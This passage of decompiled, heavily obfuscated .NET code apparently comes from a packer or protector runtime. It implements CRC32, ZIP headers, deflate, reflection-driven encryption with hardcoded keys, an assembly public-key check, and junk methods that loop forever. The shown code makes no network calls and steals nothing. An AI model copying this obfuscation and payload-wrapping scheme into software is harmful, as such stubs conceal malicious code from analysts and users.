              3624741850U,
              2936675148U,
              906185462U,
              1090812512U,
              3747672003U,
              2825379669U,
              829329135U,
              1181335161U,
              3412177804U,
              3160834842U,
              628085408U,
              1382605366U,
              3423369109U,
              3138078467U,
              570562233U,
              1426400815U,
              3317316542U,
              2998733608U,
              733239954U,
              1555261956U,
              3268935591U,
              3050360625U,
              752459403U,
              1541320221U,
              2607071920U,
              3965973030U,
              1969922972U,
              40735498U,
              2617837225U,
              3943577151U,
              1913087877U,
              83908371U,
              2512341634U,
              3803740692U,
              2075208622U,
              213261112U,
              2463272603U,
              3855990285U,
              2094854071U,
              198958881U,
              2262029012U,
              4057260610U,
              1759359992U,
              534414190U,
              2176718541U,
              4139329115U,
              1873836001U,
              414664567U,
              2282248934U,
              4279200368U,
              1711684554U,
              285281116U,
              2405801727U,
              4167216745U,
              1634467795U,
              376229701U,
              2685067896U,
              3608007406U,
              1308918612U,
              956543938U,
              2808555105U,
              3495958263U,
              1231636301U,
              1047427035U,
              2932959818U,
              3654703836U,
              1088359270U,
              936918000U,
              2847714899U,
              3736837829U,
              1202900863U,
              817233897U,
              3183342108U,
              3401237130U,
              1404277552U,
              615818150U,
              3134207493U,
              3453421203U,
              1423857449U,
              601450431U,
              3009837614U,
              3294710456U,
              1567103746U,
              711928724U,
              3020668471U,
              3272380065U,
              1510334235U,
              755167117U
            };
            uint maxValue = uint.MaxValue;
            uint num2 = maxValue;
            int num3 = 0;
            int length = _param1.Length;
            while (--length >= 0)
              num2 = numArray[(IntPtr) (uint) (((int) num2 ^ (int) _param1[num3++]) & (int) byte.MaxValue)] ^ num2 >> 8;
            uint num4 = num2 ^ maxValue;
            \u0006.\u0004.\u0001(obj1, 67324752);
            \u0006.\u0004.\u0001(obj1, 20);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 8);
            \u0006.\u0004.\u0001(obj1, (int) num1);
            \u0006.\u0004.\u0001(obj1, (int) num4);
            long position1 = obj1.Position;
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, _param1.Length);
            byte[] bytes = Encoding.UTF8.GetBytes("{data}");
            \u0006.\u0004.\u0001(obj1, bytes.Length);
            \u0006.\u0004.\u0001(obj1, 0);
            obj1.Write(bytes, 0, bytes.Length);
            \u0006.\u0004.\u0001(obj2, _param1);
            while (!obj2.IsNeedingInput)
            {
              byte[] buffer = new byte[512];
              int count = \u0006.\u0004.\u0001(obj2, buffer);
              if (count > 0)
                obj1.Write(buffer, 0, count);
              else
                break;
            }
            obj2.\u0007 |= 12;
            while (!obj2.IsFinished)
            {
              byte[] buffer = new byte[512];
              int count = \u0006.\u0004.\u0001(obj2, buffer);
              if (count > 0)
                obj1.Write(buffer, 0, count);
              else
                break;
            }
            long num5 = obj2.\u0001;
            \u0006.\u0004.\u0001(obj1, 33639248);
            \u0006.\u0004.\u0001(obj1, 20);
            \u0006.\u0004.\u0001(obj1, 20);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 8);
            \u0006.\u0004.\u0001(obj1, (int) num1);
            \u0006.\u0004.\u0001(obj1, (int) num4);
            \u0006.\u0004.\u0001(obj1, (int) num5);
            \u0006.\u0004.\u0001(obj1, _param1.Length);
            \u0006.\u0004.\u0001(obj1, bytes.Length);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 0);
            obj1.Write(bytes, 0, bytes.Length);
            \u0006.\u0004.\u0001(obj1, 101010256);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 0);
            \u0006.\u0004.\u0001(obj1, 1);
            \u0006.\u0004.\u0001(obj1, 1);
            \u0006.\u0004.\u0001(obj1, 46 + bytes.Length);
            \u0006.\u0004.\u0001(obj1, (int) ((long) (30 + bytes.Length) + num5));
            \u0006.\u0004.\u0001(obj1, 0);
            obj1.Seek(position1, SeekOrigin.Begin);
            \u0006.\u0004.\u0001(obj1, (int) num5);
            break;
          case 1:
            \u0006.\u0004.\u0001(obj1, 25000571);
            \u0006.\u0004.\u0001(obj1, _param1.Length);
            byte[] dst;
            for (int srcOffset = 0; srcOffset < _param1.Length; srcOffset += dst.Length)
            {
              dst = new byte[Math.Min(2097151, _param1.Length - srcOffset)];
              Buffer.BlockCopy((Array) _param1, srcOffset, (Array) dst, 0, dst.Length);
              long position2 = obj1.Position;
              \u0006.\u0004.\u0001(obj1, 0);
              \u0006.\u0004.\u0001(obj1, dst.Length);
              \u0003.\u0003.\u0006 obj3 = new \u0003.\u0003.\u0006();
              \u0006.\u0004.\u0001(obj3, dst);
              while (!obj3.IsNeedingInput)
              {
                byte[] buffer = new byte[512];
                int count = \u0006.\u0004.\u0001(obj3, buffer);
                if (count > 0)
                  obj1.Write(buffer, 0, count);
                else
                  break;
              }
              obj3.\u0007 |= 12;
              while (!obj3.IsFinished)
              {
                byte[] buffer = new byte[512];
                int count = \u0006.\u0004.\u0001(obj3, buffer);
                if (count > 0)
                  obj1.Write(buffer, 0, count);
                else
                  break;
              }
              long position3 = obj1.Position;
              obj1.Position = position2;
              \u0006.\u0004.\u0001(obj1, (int) obj3.\u0001);
              obj1.Position = position3;
            }
            break;
          case 2:
            \u0006.\u0004.\u0001(obj1, 41777787);
            byte[] inputBuffer1 = \u0006.\u0004.\u0001(1, _param1, (byte[]) null, (byte[]) null);
            using (\u0004.\u0003 obj4 = new \u0004.\u0003())
            {
              using (ICryptoTransform cryptoTransform = \u0006.\u0004.\u0001(false, obj4, _param2, _param3))
              {
                byte[] buffer = cryptoTransform.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                obj1.Write(buffer, 0, buffer.Length);
                break;
              }
            }
          case 3:
            \u0006.\u0004.\u0001(obj1, 58555003);
            byte[] inputBuffer2 = \u0006.\u0004.\u0001(1, _param1, (byte[]) null, (byte[]) null);
            using (\u0001.\u0002 obj5 = new \u0001.\u0002())
            {
              using (ICryptoTransform cryptoTransform = \u0006.\u0004.\u0001(_param3, false, _param2, obj5))
              {
                byte[] buffer = cryptoTransform.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                obj1.Write(buffer, 0, buffer.Length);
                break;
              }
            }
        }
        obj1.Flush();
        obj1.Close();
        return obj1.ToArray();
      }
      catch (Exception ex)
      {
        \u0003.\u0003.\u0001 = "ERR 2003: " + ex.Message;
        throw;
      }
    }

    static int \u0001(\u0003.\u0003.\u0003 _param0, \u0003.\u0003.\u0002 _param1, [In] int obj2)
    {
      obj2 = Math.Min(Math.Min(obj2, 32768 - _param0.\u0004), _param1.AvailableBytes);
      int num1 = 32768 - _param0.\u0003;
      int num2;
      if (obj2 > num1)
      {
        num2 = \u0006.\u0004.\u0001(_param1, _param0.\u0001, _param0.\u0003, num1);
        if (num2 == num1)
          num2 += \u0006.\u0004.\u0001(_param1, _param0.\u0001, 0, obj2 - num1);
      }
      else
        num2 = \u0006.\u0004.\u0001(_param1, _param0.\u0001, _param0.\u0003, obj2);
      _param0.\u0003 = _param0.\u0003 + num2 & (int) short.MaxValue;
      _param0.\u0004 += num2;
      return num2;
    }

    static bool \u0001(\u0003.\u0003.\u0007 _param0, [In] int obj1)
    {
      _param0.\u0001[_param0.\u000E] = (short) 0;
      _param0.\u0002[_param0.\u000E++] = (byte) obj1;
      short[] numArray;
      IntPtr index;
      (numArray = _param0.\u0001.\u0001)[(int) (index = (IntPtr) obj1)] = (short) ((int) numArray[index] + 1);
      return _param0.\u000E >= 16384;
    }

    static void \u0001(\u0003.\u0003.\u0002 _param0, [In] int obj1)
    {
      _param0.\u0001 >>= obj1;
      _param0.\u0003 -= obj1;
    }

    static \u0003.\u0003.\u0004 \u0001([In] \u0003.\u0003.\u0005 obj0)
    {
      byte[] numArray = new byte[obj0.\u0008];
      Array.Copy((Array) obj0.\u0002, 0, (Array) numArray, 0, obj0.\u0008);
      return new \u0003.\u0003.\u0004(numArray);
    }

    static void \u0001(\u0003.\u0003.\u0007.\u0001 _param0, [In] \u0003.\u0003.\u0007.\u0001 obj1)
    {
      int num1 = -1;
      int index1 = 0;
      while (index1 < _param0.\u0002)
      {
        int num2 = 1;
        int num3 = (int) _param0.\u0001[index1];
        int num4;
        int num5;
        if (num3 == 0)
        {
          num4 = 138;
          num5 = 3;
        }
        else
        {
          num4 = 6;
          num5 = 3;
          if (num1 != num3)
          {
            short[] numArray;
            IntPtr index2;
            (numArray = obj1.\u0001)[(int) (index2 = (IntPtr) num3)] = (short) ((int) numArray[index2] + 1);
            num2 = 0;
          }
        }
        num1 = num3;
        ++index1;
        while (index1 < _param0.\u0002 && num1 == (int) _param0.\u0001[index1])
        {
          ++index1;
          if (++num2 >= num4)
            break;
        }
        if (num2 < num5)
        {
          short[] numArray;
          IntPtr index3;
          (numArray = obj1.\u0001)[(int) (index3 = (IntPtr) num1)] = (short) ((int) numArray[index3] + (int) (short) num2);
        }
        else if (num1 != 0)
        {
          short[] numArray;
          (numArray = obj1.\u0001)[16] = (short) ((int) numArray[16] + 1);
        }
        else if (num2 <= 10)
        {
          short[] numArray;
          (numArray = obj1.\u0001)[17] = (short) ((int) numArray[17] + 1);
        }
        else
        {
          short[] numArray;
          (numArray = obj1.\u0001)[18] = (short) ((int) numArray[18] + 1);
        }
      }
    }

    static bool \u0001([In] \u0003.\u0003.\u0008 obj0) => obj0.\u0018 == obj0.\u0017;

    static int \u0001([In] \u0003.\u0003.\u000F obj0) => \u0006.\u0004.\u0001(obj0) | \u0006.\u0004.\u0001(obj0) << 16;

    static int \u0001([In] \u0003.\u0003.\u0008 obj0)
    {
      int index = (obj0.\u0010 << 5 ^ (int) obj0.\u0001[obj0.\u0014 + 2]) & (int) short.MaxValue;
      short num;
      obj0.\u0002[obj0.\u0014 & (int) short.MaxValue] = num = obj0.\u0001[index];
      obj0.\u0001[index] = (short) obj0.\u0014;
      obj0.\u0010 = index;
      return (int) num & (int) ushort.MaxValue;
    }

    static void \u0001([In] \u0003.\u0003.\u0007.\u0001 obj0)
    {
      int length = obj0.\u0001.Length;
      int[] numArray1 = new int[length];
      int num1 = 0;
      int num2 = 0;
      for (int index1 = 0; index1 < length; ++index1)
      {
        int num3 = (int) obj0.\u0001[index1];
        if (num3 != 0)
        {
          int index2;
          int index3;
          for (index2 = num1++; index2 > 0 && (int) obj0.\u0001[numArray1[index3 = (index2 - 1) / 2]] > num3; index2 = index3)
            numArray1[index2] = numArray1[index3];
          numArray1[index2] = index1;
          num2 = index1;
        }
      }
      int num4;
      for (; num1 < 2; numArray1[num1++] = num4)
      {
        int num5;
        if (num2 >= 2)
          num5 = 0;
        else
          num2 = num5 = num2 + 1;
        num4 = num5;
      }
      obj0.\u0002 = Math.Max(num2 + 1, obj0.\u0001);
      int num6 = num1;
      int[] numArray2 = new int[4 * num1 - 2];
      int[] numArray3 = new int[2 * num1 - 1];
      int num7 = num6;
      for (int index4 = 0; index4 < num1; ++index4)
      {
        int index5 = numArray1[index4];
        numArray2[2 * index4] = index5;
        numArray2[2 * index4 + 1] = -1;
        numArray3[index4] = (int) obj0.\u0001[index5] << 8;
        numArray1[index4] = index4;
      }
      do
      {
        int index6 = numArray1[0];
        int index7 = numArray1[--num1];
        int index8 = 0;
        for (int index9 = 1; index9 < num1; index9 = index9 * 2 + 1)
        {
          if (index9 + 1 < num1 && numArray3[numArray1[index9]] > numArray3[numArray1[index9 + 1]])
            ++index9;
          numArray1[index8] = numArray1[index9];
          index8 = index9;
        }
        int num8 = numArray3[index7];
        int index10;
        while ((index10 = index8) > 0 && numArray3[numArray1[index8 = (index10 - 1) / 2]] > num8)
          numArray1[index10] = numArray1[index8];
        numArray1[index10] = index7;
        int index11 = numArray1[0];
        int index12 = num7++;
        numArray2[2 * index12] = index6;
        numArray2[2 * index12 + 1] = index11;
        int num9 = Math.Min(numArray3[index6] & (int) byte.MaxValue, numArray3[index11] & (int) byte.MaxValue);
        int num10;
        numArray3[index12] = num10 = numArray3[index6] + numArray3[index11] - num9 + 1;
        int index13 = 0;
        for (int index14 = 1; index14 < num1; index14 = index13 * 2 + 1)
        {
          if (index14 + 1 < num1 && numArray3[numArray1[index14]] > numArray3[numArray1[index14 + 1]])
            ++index14;
          numArray1[index13] = numArray1[index14];
          index13 = index14;
        }
        int index15;
        while ((index15 = index13) > 0 && numArray3[numArray1[index13 = (index15 - 1) / 2]] > num10)
          numArray1[index15] = numArray1[index13];
        numArray1[index15] = index12;
      }
      while (num1 > 1);
      \u0006.\u0004.\u0001(numArray2, obj0);
    }

    static int \u0001(\u0003.\u0003.\u0002 _param0, [In] int obj1)
    {
      if (_param0.\u0003 < obj1)
      {
        if (_param0.\u0001 == _param0.\u0002)
          return -1;
        _param0.\u0001 |= (uint) (((int) _param0.\u0001[_param0.\u0001++] & (int) byte.MaxValue | ((int) _param0.\u0001[_param0.\u0001++] & (int) byte.MaxValue) << 8) << _param0.\u0003);
        _param0.\u0003 += 16;
      }
      return (int) ((long) _param0.\u0001 & (long) ((1 << obj1) - 1));
    }

    static void \u0001([In] \u0003.\u0003.\u0002 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static void \u0001(\u0003.\u0003.\u0007.\u0001 _param0, [In] int obj1) => \u0006.\u0004.\u0001(_param0.\u0001.\u0001, (int) _param0.\u0002[obj1] & (int) ushort.MaxValue, (int) _param0.\u0001[obj1]);

    static void \u0001([In] \u0003.\u0003.\u0006 obj0) => obj0.\u0007 |= 12;

    static void \u0001(\u0003.\u0003.\u0007.\u0001 _param0, [In] \u0003.\u0003.\u0007.\u0001 obj1)
    {
      int num1 = -1;
      int index = 0;
      while (index < _param0.\u0002)
      {
        int num2 = 1;
        int num3 = (int) _param0.\u0001[index];
        int num4;
        int num5;
        if (num3 == 0)
        {
          num4 = 138;
          num5 = 3;
        }
        else
        {
          num4 = 6;
          num5 = 3;
          if (num1 != num3)
          {
            \u0006.\u0004.\u0001(obj1, num3);
            num2 = 0;
          }
        }
        num1 = num3;
        ++index;
        while (index < _param0.\u0002 && num1 == (int) _param0.\u0001[index])
        {
          ++index;
          if (++num2 >= num4)
            break;
        }
        if (num2 < num5)
        {
          while (num2-- > 0)
            \u0006.\u0004.\u0001(obj1, num1);
        }
        else if (num1 != 0)
        {
          \u0006.\u0004.\u0001(obj1, 16);
          \u0006.\u0004.\u0001(_param0.\u0001.\u0001, num2 - 3, 2);
        }
        else if (num2 <= 10)
        {
          \u0006.\u0004.\u0001(obj1, 17);
          \u0006.\u0004.\u0001(_param0.\u0001.\u0001, num2 - 3, 3);
        }
        else
        {
          \u0006.\u0004.\u0001(obj1, 18);
          \u0006.\u0004.\u0001(_param0.\u0001.\u0001, num2 - 11, 7);
        }
      }
    }

    static bool \u0001(bool _param0, \u0003.\u0003.\u0008 _param1, [In] bool obj2)
    {
      bool flag1;
      do
      {
        \u0006.\u0004.\u0001(_param1);
        bool flag2 = _param0 && _param1.\u0017 == _param1.\u0018;
        flag1 = \u0006.\u0004.\u0001(obj2, _param1, flag2);
      }
      while (_param1.\u0001.\u0002 == 0 && flag1);
      return flag1;
    }

    static byte[] \u0001(byte[] _param0, byte[] _param1, byte[] _param2) => \u0006.\u0004.\u0001(2, _param2, _param0, _param1);

    static void \u0001([In] \u0003.\u0003.\u0008 obj0)
    {
      Array.Copy((Array) obj0.\u0001, 32768, (Array) obj0.\u0001, 0, 32768);
      obj0.\u0011 -= 32768;
      obj0.\u0014 -= 32768;
      obj0.\u0013 -= 32768;
      for (int index = 0; index < 32768; ++index)
      {
        int num = (int) obj0.\u0001[index] & (int) ushort.MaxValue;
        obj0.\u0001[index] = num >= 32768 ? (short) (num - 32768) : (short) 0;
      }
      for (int index = 0; index < 32768; ++index)
      {
        int num = (int) obj0.\u0002[index] & (int) ushort.MaxValue;
        obj0.\u0002[index] = num >= 32768 ? (short) (num - 32768) : (short) 0;
      }
    }

    static void \u0001([In] \u0003.\u0003.\u0008 obj0)
    {
      if (obj0.\u0014 >= 65274)
        \u0006.\u0004.\u0001(obj0);
      int length;
      for (; obj0.\u0015 < 262 && obj0.\u0017 < obj0.\u0018; obj0.\u0015 += length)
      {
        length = 65536 - obj0.\u0015 - obj0.\u0014;
        if (length > obj0.\u0018 - obj0.\u0017)
          length = obj0.\u0018 - obj0.\u0017;
        Array.Copy((Array) obj0.\u0002, obj0.\u0017, (Array) obj0.\u0001, obj0.\u0014 + obj0.\u0015, length);
        obj0.\u0017 += length;
        obj0.\u0016 += length;
      }
      if (obj0.\u0015 < 3)
        return;
      \u0006.\u0004.\u0001(obj0);
    }

    static void \u0001(int _param0, int _param1, \u0003.\u0003.\u000E _param2, [In] byte[] obj3)
    {
      Array.Copy((Array) obj3, _param0, (Array) _param2.\u0001, _param2.\u0002, _param1);
      _param2.\u0002 += _param1;
    }

    static int \u0001([In] \u0003.\u0003.\u000F obj0) => obj0.ReadByte() | obj0.ReadByte() << 8;

    static void \u0001(\u0003.\u0003.\u000F _param0, [In] int obj1)
    {
      _param0.WriteByte((byte) (obj1 & (int) byte.MaxValue));
      _param0.WriteByte((byte) (obj1 >> 8 & (int) byte.MaxValue));
    }

    static void \u0001(int _param0, \u0003.\u0003.\u0003 _param1, byte[] _param2, [In] int obj3)
    {
      if (_param1.\u0004 > 0)
        throw new InvalidOperationException();
      if (_param0 > 32768)
      {
        obj3 += _param0 - 32768;
        _param0 = 32768;
      }
      Array.Copy((Array) _param2, obj3, (Array) _param1.\u0001, 0, _param0);
      _param1.\u0003 = _param0 & (int) short.MaxValue;
    }

    static void \u0001([In] \u0004.\u0001 obj0)
    {
      long num1 = 39584;
      long num2 = 0;
      bool flag = true;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        flag = true;
        ProjectData.ClearProjectError();
      }
      num2 = 1L;
      double num3 = 70051.0;
      while (true)
      {
        num1 = 22373754L;
        num3 = 32614398.0;
        num1 = 784488618L;
        num2 = 50263L;
      }
    }

    static void \u0001([In] \u0002.\u0002 obj0)
    {
    }

    static void \u0001([In] \u0003.\u0003.\u0002 obj0) => obj0.\u0001 = (uint) (obj0.\u0001 = obj0.\u0002 = obj0.\u0003 = 0);

    static void \u0001(int _param0, byte[] _param1, int _param2, [In] \u0003.\u0003.\u0002 obj3)
    {
      if (obj3.\u0001 < obj3.\u0002)
        throw new InvalidOperationException();
      int num = _param2 + _param0;
      if (0 > _param2 || _param2 > num || num > _param1.Length)
        throw new ArgumentOutOfRangeException();
      if ((_param0 & 1) != 0)
      {
        obj3.\u0001 |= (uint) (((int) _param1[_param2++] & (int) byte.MaxValue) << obj3.\u0003);
        obj3.\u0003 += 8;
      }
      obj3.\u0001 = _param1;
      obj3.\u0001 = _param2;
      obj3.\u0002 = num;
    }

    static void \u0001([In] \u0002.\u0003 obj0)
    {
      Decimal num1 = 805275M;
      long num2 = 989428222;
      long num3 = 2;
      num1 = 694607496M;
      num1 = 169887M;
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num2 = 339L;
        int num4 = (int) MessageBox.Show(\u0003.\u0002.\u0001(1770));
        \u0003.\u0002.\u0001(1807);
        ProjectData.ClearProjectError();
      }
      num3 = 40103638L;
      num2 = 84142762L;
      while (true)
      {
        num1 = 658763M;
        \u0003.\u0002.\u0001(1924);
        \u0003.\u0002.\u0001(2154);
        \u0003.\u0002.\u0001(2348);
        \u0003.\u0002.\u0001(2482);
      }
    }

    static ICryptoTransform \u0001(
      byte[] _param0,
      bool _param1,
      byte[] _param2,
      [In] \u0001.\u0002 obj3)
    {
      obj3.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj3.\u0001, new object[1]
      {
        (object) _param2
      });
      obj3.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj3.\u0001, new object[1]
      {
        (object) _param0
      });
      return (ICryptoTransform) obj3.\u0001.GetMethod(_param1 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(obj3.\u0001, new object[0]);
    }

    static bool \u0001(Assembly _param0, Assembly _param1)
    {
      byte[] publicKey1 = _param0.GetName().GetPublicKey();
      byte[] publicKey2 = _param1.GetName().GetPublicKey();
      if (publicKey2 == null != (publicKey1 == null))
        return false;
      if (publicKey2 != null)
      {
        for (int index = 0; index < publicKey2.Length; ++index)
        {
          if ((int) publicKey2[index] != (int) publicKey1[index])
            return false;
        }
      }
      return true;
    }

    static void \u0001(\u0003.\u0003.\u0003 _param0, int _param1, int _param2, [In] int obj3)
    {
      while (_param2-- > 0)
      {
        _param0.\u0001[_param0.\u0003++] = _param0.\u0001[_param1++];
        _param0.\u0003 &= (int) short.MaxValue;
        _param1 &= (int) short.MaxValue;
      }
    }

    static void \u0001(short[] _param0, \u0003.\u0003.\u0007.\u0001 _param1, [In] byte[] obj2)
    {
      _param1.\u0002 = _param0;
      _param1.\u0001 = obj2;
    }

    static int \u0001(\u0003.\u0003.\u0002 _param0, byte[] _param1, int _param2, [In] int obj3)
    {
      int num1 = 0;
      while (_param0.\u0003 > 0 && obj3 > 0)
      {
        _param1[_param2++] = (byte) _param0.\u0001;
        _param0.\u0001 >>= 8;
        _param0.\u0003 -= 8;
        --obj3;
        ++num1;
      }
      if (obj3 == 0)
        return num1;
      int num2 = _param0.\u0002 - _param0.\u0001;
      if (obj3 > num2)
        obj3 = num2;
      Array.Copy((Array) _param0.\u0001, _param0.\u0001, (Array) _param1, _param2, obj3);
      _param0.\u0001 += obj3;
      if ((_param0.\u0001 - _param0.\u0002 & 1) != 0)
      {
        _param0.\u0001 = (uint) _param0.\u0001[_param0.\u0001++] & (uint) byte.MaxValue;
        _param0.\u0003 = 8;
      }
      return num1 + obj3;
    }

    static byte[] \u0001(byte[] _param0)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0006.\u0004.\u0001(executingAssembly, callingAssembly))
        return (byte[]) null;
      \u0003.\u0003.\u000F obj1 = new \u0003.\u0003.\u000F(_param0);
      byte[] numArray1 = new byte[0];
      int num1 = \u0006.\u0004.\u0001(obj1);
      if (num1 == 67324752)
      {
        short num2 = (short) \u0006.\u0004.\u0001(obj1);
        int num3 = \u0006.\u0004.\u0001(obj1);
        int num4 = \u0006.\u0004.\u0001(obj1);
        if (num1 != 67324752 || num2 != (short) 20 || num3 != 0 || num4 != 8)
          throw new FormatException("Wrong Header Signature");
        \u0006.\u0004.\u0001(obj1);
        \u0006.\u0004.\u0001(obj1);
        \u0006.\u0004.\u0001(obj1);
        int length = \u0006.\u0004.\u0001(obj1);
        int count1 = \u0006.\u0004.\u0001(obj1);
        int count2 = \u0006.\u0004.\u0001(obj1);
        if (count1 > 0)
        {
          byte[] buffer = new byte[count1];
          obj1.Read(buffer, 0, count1);
        }
        if (count2 > 0)
        {
          byte[] buffer = new byte[count2];
          obj1.Read(buffer, 0, count2);
        }
        byte[] numArray2 = new byte[obj1.Length - obj1.Position];
        obj1.Read(numArray2, 0, numArray2.Length);
        \u0003.\u0003.\u0001 obj2 = new \u0003.\u0003.\u0001(numArray2);
        numArray1 = new byte[length];
        \u0006.\u0004.\u0001(numArray1, 0, obj2, numArray1.Length);
      }
      else
      {
        int num5 = num1 >> 24;
        if (num1 - (num5 << 24) != 8223355)
          throw new FormatException("Unknown Header");
        if (num5 == 1)
        {
          int length1 = \u0006.\u0004.\u0001(obj1);
          numArray1 = new byte[length1];
          int num6;
          for (int index = 0; index < length1; index += num6)
          {
            int length2 = \u0006.\u0004.\u0001(obj1);
            num6 = \u0006.\u0004.\u0001(obj1);
            byte[] numArray3 = new byte[length2];
            obj1.Read(numArray3, 0, numArray3.Length);
            \u0003.\u0003.\u0001 obj3 = new \u0003.\u0003.\u0001(numArray3);
            \u0006.\u0004.\u0001(numArray1, index, obj3, num6);
          }
        }
        if (num5 == 2)
        {
          byte[] numArray4 = new byte[8]
          {
            (byte) 177,
            (byte) 7,
            (byte) 203,
            (byte) 219,
            (byte) 13,
            (byte) 123,
            (byte) 206,
            (byte) 143
          };
          byte[] numArray5 = new byte[8]
          {
            (byte) 236,
            (byte) 14,
            (byte) 253,
            (byte) 127,
            (byte) 244,
            (byte) 134,
            (byte) 128,
            (byte) 107
          };
          using (\u0004.\u0003 obj4 = new \u0004.\u0003())
          {
            using (ICryptoTransform cryptoTransform = \u0006.\u0004.\u0001(true, obj4, numArray4, numArray5))
              numArray1 = \u0006.\u0004.\u0001(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
          }
        }
        if (num5 == 3)
        {
          byte[] numArray6 = new byte[16]
          {
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1,
            (byte) 1
          };
          byte[] numArray7 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
          using (\u0001.\u0002 obj5 = new \u0001.\u0002())
          {
            using (ICryptoTransform cryptoTransform = \u0006.\u0004.\u0001(numArray7, true, numArray6, obj5))
              numArray1 = \u0006.\u0004.\u0001(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
          }
        }
      }
      obj1.Close();
      return numArray1;
    }

    static bool \u0001(bool _param0, \u0003.\u0003.\u0008 _param1, [In] bool obj2)
    {
      if (_param1.\u0015 < 262 && !obj2)
        return false;
      while (_param1.\u0015 >= 262 || obj2)
      {
        if (_param1.\u0015 == 0)
        {
          if (_param1.\u0001)
            \u0006.\u0004.\u0001(_param1.\u0001, (int) _param1.\u0001[_param1.\u0014 - 1] & (int) byte.MaxValue);
          _param1.\u0001 = false;
          \u0003.\u0003.\u0007 obj = _param1.\u0001;
          byte[] numArray = _param1.\u0001;
          int num1 = _param1.\u0013;
          int num2 = _param1.\u0014 - _param1.\u0013;
          \u0006.\u0004.\u0001(num1, numArray, num2, obj, _param0);
          _param1.\u0013 = _param1.\u0014;
          return false;
        }
        if (_param1.\u0014 >= 65274)
          \u0006.\u0004.\u0001(_param1);
        int num3 = _param1.\u0011;
        int num4 = _param1.\u0012;
        if (_param1.\u0015 >= 3)
        {
          int num5 = \u0006.\u0004.\u0001(_param1);
          if (num5 != 0 && _param1.\u0014 - num5 <= 32506 && \u0006.\u0004.\u0001(num5, _param1) && _param1.\u0012 <= 5 && _param1.\u0012 == 3 && _param1.\u0014 - _param1.\u0011 > 4096)
            _param1.\u0012 = 2;
        }
        if (num4 >= 3 && _param1.\u0012 <= num4)
        {
          \u0003.\u0003.\u0007 obj = _param1.\u0001;
          \u0006.\u0004.\u0001(_param1.\u0014 - 1 - num3, obj, num4);
          int num6 = num4 - 2;
          do
          {
            ++_param1.\u0014;
            --_param1.\u0015;
            if (_param1.\u0015 >= 3)
              \u0006.\u0004.\u0001(_param1);
          }
          while (--num6 > 0);
          ++_param1.\u0014;
          --_param1.\u0015;
          _param1.\u0001 = false;
          _param1.\u0012 = 2;
        }
        else
        {
          if (_param1.\u0001)
            \u0006.\u0004.\u0001(_param1.\u0001, (int) _param1.\u0001[_param1.\u0014 - 1] & (int) byte.MaxValue);
          _param1.\u0001 = true;
          ++_param1.\u0014;
          --_param1.\u0015;
        }
        if (_param1.\u0001.\u000E >= 16384)
        {
          int num7 = _param1.\u0014 - _param1.\u0013;
          if (_param1.\u0001)
            --num7;
          bool flag = _param0 && _param1.\u0015 == 0 && !_param1.\u0001;
          \u0003.\u0003.\u0007 obj = _param1.\u0001;
          byte[] numArray = _param1.\u0001;
          \u0006.\u0004.\u0001(_param1.\u0013, numArray, num7, obj, flag);
          _param1.\u0013 += num7;
          return !flag;
        }
      }
      return true;
    }

    static int \u0001([In] \u0003.\u0003.\u0007.\u0001 obj0)
    {
      int num = 0;
      for (int index = 0; index < obj0.\u0001.Length; ++index)
        num += (int) obj0.\u0001[index] * (int) obj0.\u0001[index];
      return num;
    }

    static byte[] \u0001(byte[] _param0) => \u0006.\u0004.\u0001(1, _param0, (byte[]) null, (byte[]) null);

    static byte[] \u0001(byte[] _param0, byte[] _param1, byte[] _param2) => \u0006.\u0004.\u0001(3, _param1, _param0, _param2);

    static short \u0001(int _param0) => (short) ((int) \u0003.\u0003.\u0007.\u0001[_param0 & 15] << 12 | (int) \u0003.\u0003.\u0007.\u0001[_param0 >> 4 & 15] << 8 | (int) \u0003.\u0003.\u0007.\u0001[_param0 >> 8 & 15] << 4 | (int) \u0003.\u0003.\u0007.\u0001[_param0 >> 12]);

    static void \u0001(int _param0, [In] \u0003.\u0003.\u0007 obj1)
    {
      \u0006.\u0004.\u0001(obj1.\u0003);
      \u0006.\u0004.\u0001(obj1.\u0001);
      \u0006.\u0004.\u0001(obj1.\u0002);
      \u0006.\u0004.\u0001(obj1.\u0001, obj1.\u0001.\u0002 - 257, 5);
      \u0006.\u0004.\u0001(obj1.\u0001, obj1.\u0002.\u0002 - 1, 5);
      \u0006.\u0004.\u0001(obj1.\u0001, _param0 - 4, 4);
      for (int index = 0; index < _param0; ++index)
        \u0006.\u0004.\u0001(obj1.\u0001, (int) obj1.\u0003.\u0001[\u0003.\u0003.\u0007.\u0001[index]], 3);
